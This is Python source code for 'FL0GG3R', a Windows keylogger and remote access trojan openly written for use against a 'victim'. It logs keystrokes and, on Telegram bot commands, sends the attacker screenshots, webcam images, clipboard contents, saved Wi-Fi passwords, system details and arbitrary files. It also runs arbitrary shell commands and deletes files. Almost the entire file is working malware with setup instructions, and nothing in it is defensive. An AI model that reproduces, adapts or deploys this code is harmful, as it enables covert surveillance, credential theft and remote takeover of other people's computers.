"""
FL0GG3R v1.0 - An Advanced Keylogger made by @XxPL3NTYxX (Telegram user name) to send Keylogs, Wifi Information, System Information ( Detailed + Basic ),
ScreenShots, WebCam Images, Download and Delete files from Victim's computer,  Clipboard Data, and many much CMD based commands
On Telegram Using custom Telegram Bot
"""

# Libraries to be imported

from requests import get
import os
import pyautogui
import time
import cv2
import subprocess
import win32clipboard
import telepot
import logging
import socket
import platform
import getpass
from pynput.keyboard import Listener

"""
pip install requests
pip install pywin32
pip install python-opencv
pip install pprint 
pip install pynput 
pip install logging 
pip install pyautogui
pip install telepot
 
"""

# KeyLoggers File directory

log_dir = "C:\\Users\\Public\\" # You can choose any directory
extend = "\\"

#  To get Username

username = getpass.getuser()

# Telegram Bot Api ( use @BotFather ) and Chat ID ( use @chatid_echo_bot )

bot = telepot.Bot('Paste Bot API here')  # api
chat_id = "Paste Chat ID here"

# Keylogging configuration

logging.basicConfig(filename=(log_dir + "KeyLogs.txt"), level=logging.INFO, format='["%(asctime)s", %(message)s]')

# Keylogger Functions

# On pressing keys

def on_press(key):
    logging.info(str(key))

# Keylogger Listener

def klistener(fun):
    with Listener(on_press=on_press) as listener:
        listener.join()
        fun # FOR LOOP


# receive and send the files to telegram

def receive_command(msg):

    text = msg['text']

    if '/start' in text:
        msg = " ‍💻 𝕎𝟛𝕃ℂ𝟘𝕄𝟛 𝟚 𝔽𝕃𝟘𝔾𝔾𝟛ℝ ‍💻 " + "\n" + " Created By - @XxPL3NTYxX " + "\n" + "▶️ Connected Successfully 📶"
        bot.sendMessage(chat_id, msg)

    if '/more' in text:
        msg = " ‍💻 More Commands ‍💻 " + "\n\n" + "/cmd + help OR Windows CMD Commands " + "\n\n" + "/image + Image File name with path" + "\n\n" + "/screen + Filename.png" + "\n\n" + "/webcam + Filename.png" + "\n\n" + "/down + File name with path to download" + "\n\n" + "/delete + Filename with path and extension"
        bot.sendMessage(chat_id, msg)

    if '/cmd' in text:
        cmd = text.split()
        proc = os.popen(cmd[1])

        file_command = open("command.txt", 'w')

        for line in proc.read():
            file_command.write(line)

        file_command.close()

        with open("command.txt", 'rb') as commandu:
            bot.sendDocument(chat_id, commandu)

        os.remove("command.txt")

    if '/image' in text:
        cmd = text.split()
        filename = cmd[1]
        with open(filename, 'rb') as doc:
            bot.sendDocument(chat_id, doc)

    if '/keylog' in text:
        with open(log_dir + "KeyLogs.txt", 'rb') as doc:
            bot.sendDocument(chat_id, doc)

    if '/removekeylog' in text:
        try:
            file = open(log_dir + "KeyLogs.txt","w")
            file.close()
            msg = " Logs cleared Successfully"
            bot.sendMessage(chat_id, msg)
        except:
            msg = " Sorry Try Again"
            bot.sendMessage(chat_id, msg)

    if '/screen' in text:
        cmd = text.split()
        name_img = cmd[1]
        screenshot = pyautogui.screenshot(name_img)
        with open(name_img, 'rb') as doc:
            bot.sendDocument(chat_id, doc)
        os.remove(name_img)

    if '/down' in text:
        cmd = text.split()
        filename = cmd[1]
        with open(filename, 'rb') as doc:
            bot.sendDocument(chat_id, doc)

    if '/webcam' in text:
        img_name = text.split()
        img_n = img_name[1]
        camera_port = 0
        camera = cv2.VideoCapture(camera_port)
        time.sleep(0.5)  # For not capture black screen
        return_value, image = camera.read()
        cv2.imwrite(img_n, image)
        del (camera)
        time.sleep(1)
        with open(img_n, 'rb') as doc:
            bot.sendDocument(chat_id, doc)
        os.remove(img_n)

    if '/delete' in text:
        file = text.split()
        ex_file = file[1]
        os.remove(ex_file)  # remove files
        bot.sendMessage(chat_id, "[+] File {} has been removed!").format(ex_file)

    if '/wifi' in text:
        all = ""
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8',errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8',errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                message = ("{:<30} -  {:<}\n".format(i, results[0]))
                all = all + "\n" + message
            except IndexError:
                message = ("{:<30} -  {:<}\n".format(i, ""))
                all = all + "\n" + message
        bot.sendMessage(chat_id, all)

    if '/info' in text:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            msg1 = ("Public IP Address: " + public_ip + "\n")
        except Exception:
            msg1 = ("Could not get Public IP Address\n")
        msg2 = ("Processor: " + (platform.processor()) + "\n")
        msg3 = ("System: " + platform.system() + " " + platform.version() + "\n")
        msg4 = ("Machine: " + platform.machine() + "\n")
        msg5 = ("Hostname: " + hostname + "\n")
        msg6 = ("Private IP Address: " + IPAddr + "\n")
        msg7 = ("Platform Release: " + platform.release() + "\n")
        msg8 = ("OS version: " + platform.platform())
        msg = msg1 + "\n" + msg2 + "\n" + msg3 + "\n" + msg4 + "\n" + msg5 + "\n" + msg6 + "\n" + msg7 +"\n" + msg8 
        bot.sendMessage(chat_id, msg)

    if '/clip' in text:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            clipb = ("Clipboard Data: \n" + pasted_data)
        except:
            clipb = ("Clipboard Data could not be Copied")
        bot.sendMessage(chat_id, clipb)

    if '/detail_info' in text:
        myCmd = os.popen('systeminfo')
        file_command = open("Systeminfo.txt", 'w')

        for line in myCmd.read():
            file_command.write(line)

        file_command.close()

        with open("Systeminfo.txt", 'rb') as sysinfo:
            bot.sendDocument(chat_id, sysinfo)

        os.remove("Systeminfo.txt")


try:
    klistener(bot.message_loop(receive_command))
finally:
    os.remove("KeyLogs.txt") # Removes the text file
